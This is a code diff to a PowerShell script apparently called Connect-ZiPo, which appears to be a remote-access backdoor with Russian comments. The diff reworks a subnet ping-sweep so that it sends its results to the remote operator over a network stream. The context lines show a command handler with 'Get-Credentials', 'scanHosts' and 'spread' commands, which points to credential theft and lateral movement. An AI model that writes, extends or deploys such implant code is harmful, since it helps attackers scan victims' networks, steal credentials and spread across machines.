@@ -7,6 +7,10 @@ function Connect-ZiPo {
 
 
     function Get-AliveHosts {
+    param(
+        [System.Net.Sockets.NetworkStream]$stream
+    )
+
     function Is-Alive {
         param ([string]$ip)
         try {
@@ -19,34 +23,44 @@ function Connect-ZiPo {
     }
 
     try {
+        # Получаем локальный IPv4-адрес для определения подсети
         $ipv4 = (Get-NetIPAddress -AddressFamily IPv4 |
             Where-Object { $_.IPAddress -match '^192\.168\.\d+\.\d+$' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
-
         $subnet = ($ipv4 -replace '\.\d+$', '.')
+        
         $alive = @()
-        $output = ""
 
+        # Цикл по диапазону адресов 1..254
         1..254 | ForEach-Object {
             $ip = "$subnet$_"
-            $output += "`r[*] Scanning $ip..." + "`n"
+            $line = "`r[*] Scanning $ip...`n"
+            $bytes = [Text.Encoding]::UTF8.GetBytes($line)
+            $stream.Write($bytes, 0, $bytes.Length)
+            $stream.Flush()
+
             if (Is-Alive $ip) {
-                $output += "`r[+] $ip is alive" + "`n"
+                $line = "`r[+] $ip is alive`n"
                 $alive += $ip
             } else {
-                $output += "`r[ ] $ip is offline" + "`n"
+                $line = "`r[ ] $ip is offline`n"
             }
+            $bytes = [Text.Encoding]::UTF8.GetBytes($line)
+            $stream.Write($bytes, 0, $bytes.Length)
+            $stream.Flush()
         }
-        $output += "`nAlive hosts:" + "`n" + ($alive -join "`n")
-        Write-Output $output
+
+        $final = "`nAlive hosts:`n" + ($alive -join "`n") + "`n"
+        $bytes = [Text.Encoding]::UTF8.GetBytes($final)
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Flush()
     }
     catch {
-        Write-Output "[ERROR] scanHosts failed: $($_.Exception.Message)"
+        $errLine = "[ERROR] scanHosts failed: $($_.Exception.Message)`n"
+        $bytes = [Text.Encoding]::UTF8.GetBytes($errLine)
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Flush()
     }
 }
-
-
-
-
 
     
 
@@ -390,7 +404,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Get-Credentials
                     }
                     elseif ($cmd -eq "scanHosts") {
-                        $response = Get-AliveHosts
+                        Get-AliveHosts -stream $stream
+                        $response = ""
                     }
                     elseif ($cmd.StartsWith("spread")) {
                         $args = $cmd.Split(" ")
